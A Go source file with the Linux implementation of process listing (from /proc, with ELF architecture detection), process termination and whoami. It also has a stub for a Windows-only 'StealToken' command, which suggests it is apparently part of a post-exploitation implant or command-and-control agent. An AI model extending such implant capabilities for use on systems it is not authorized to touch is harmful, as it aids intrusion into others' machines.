//go:build !windows && !darwin

package command

import (
	"encoding/binary"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
)

func listProcesses(acp int) ([]ProcessInfo, error) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, err
	}

	uidCache := make(map[string]string)
	results := make([]ProcessInfo, 0, len(entries))
	for _, entry := range entries {
		if !entry.IsDir() || !isDecimalString(entry.Name()) {
			continue
		}
		proc, ok := readLinuxProcess(entry.Name(), uidCache)
		if ok {
			results = append(results, proc)
		}
	}
	return results, nil
}

func readLinuxProcess(pidText string, uidCache map[string]string) (ProcessInfo, bool) {
	pid64, err := strconv.ParseUint(pidText, 10, 32)
	if err != nil {
		return ProcessInfo{}, false
	}

	base := filepath.Join("/proc", pidText)
	name := readFirstLine(filepath.Join(base, "comm"))
	ppid, sessionID := readProcStat(filepath.Join(base, "stat"))
	path := readProcExePath(base)
	uid := readProcUID(filepath.Join(base, "status"))
	userName := lookupUIDName(uid, uidCache)

	if name == "" {
		name = filepath.Base(path)
	}
	if name == "." || name == string(os.PathSeparator) {
		name = ""
	}

	return ProcessInfo{
		PID:       uint32(pid64),
		PPID:      ppid,
		Name:      name,
		Path:      path,
		User:      userName,
		Arch:      readELFArch(path),
		SessionID: sessionID,
	}, true
}

func readProcStat(path string) (uint32, uint32) {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0, 0
	}
	line := strings.TrimSpace(string(data))
	end := strings.LastIndex(line, ")")
	if end < 0 || end+2 >= len(line) {
		return 0, 0
	}

	fields := strings.Fields(line[end+2:])
	if len(fields) < 4 {
		return 0, 0
	}

	ppid, _ := strconv.ParseUint(fields[1], 10, 32)
	sessionID, _ := strconv.ParseUint(fields[3], 10, 32)
	return uint32(ppid), uint32(sessionID)
}

func readProcExePath(base string) string {
	path, err := os.Readlink(filepath.Join(base, "exe"))
	if err == nil {
		return path
	}

	data, err := os.ReadFile(filepath.Join(base, "cmdline"))
	if err != nil || len(data) == 0 {
		return ""
	}
	parts := strings.Split(string(data), "\x00")
	if len(parts) == 0 {
		return ""
	}
	return strings.TrimSpace(parts[0])
}

func readProcUID(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		if !strings.HasPrefix(line, "Uid:") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			return fields[1]
		}
	}
	return ""
}

func lookupUIDName(uid string, cache map[string]string) string {
	if uid == "" {
		return ""
	}
	if name, ok := cache[uid]; ok {
		return name
	}
	u, err := user.LookupId(uid)
	if err != nil {
		cache[uid] = uid
		return uid
	}
	name := u.Username
	if name == "" {
		name = uid
	}
	cache[uid] = name
	return name
}

func readFirstLine(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	line, _, _ := strings.Cut(string(data), "\n")
	return strings.TrimSpace(line)
}

func isDecimalString(value string) bool {
	if value == "" {
		return false
	}
	for _, r := range value {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// ELF e_machine 常量
const (
	elfEM386     = 3   // EM_386: Intel 80386
	elfEMX86_64  = 62  // EM_X86_64: AMD x86-64
	elfEMAarch64 = 183 // EM_AARCH64: ARM 64-bit
)

// ELF magic
const elfMagic = 0x7f454c46 // "\x7fELF"

// readELFArch 读取 ELF header 的 e_machine 字段，返回进程架构。
// 返回值：0=x86, 1=x64, 2=arm64。读取失败时返回 -1。
func readELFArch(path string) int32 {
	if path == "" {
		return -1
	}

	f, err := os.Open(path)
	if err != nil {
		return -1
	}
	defer f.Close()

	// 读取 ELF header 前 20 字节：e_ident(16) + e_type(2) + e_machine(2)
	var hdr [20]byte
	if _, err := f.Read(hdr[:]); err != nil {
		return -1
	}

	// 验证 ELF magic: 0x7f 'E' 'L' 'F'
	if binary.BigEndian.Uint32(hdr[0:4]) != elfMagic {
		return -1
	}

	// e_machine 在 offset 18，little-endian uint16
	eMachine := binary.LittleEndian.Uint16(hdr[18:20])
	switch eMachine {
	case elfEM386:
		return 0 // x86
	case elfEMX86_64:
		return 1 // x64
	case elfEMAarch64:
		return 2 // arm64
	default:
		return -1
	}
}

func terminateProcess(pid int) (string, error) {
	process, err := os.FindProcess(pid)
	if err != nil {
		return "", err
	}
	err = process.Kill()
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Process %d terminated", pid), nil
}

func stealTokenLogic(pid int) (string, error) {
	return "", fmt.Errorf("StealToken is only supported on Windows")
}

func whoamiLogic() (string, error) {
	hostname, _ := os.Hostname()
	username := "unknown"

	// 这里可以使用 os/user，但为了减少依赖可以尝试简单的环境变量
	if u := os.Getenv("USER"); u != "" {
		username = u
	} else if u := os.Getenv("LOGNAME"); u != "" {
		username = u
	}

	return fmt.Sprintf("%s\\%s (User)", hostname, username), nil
}
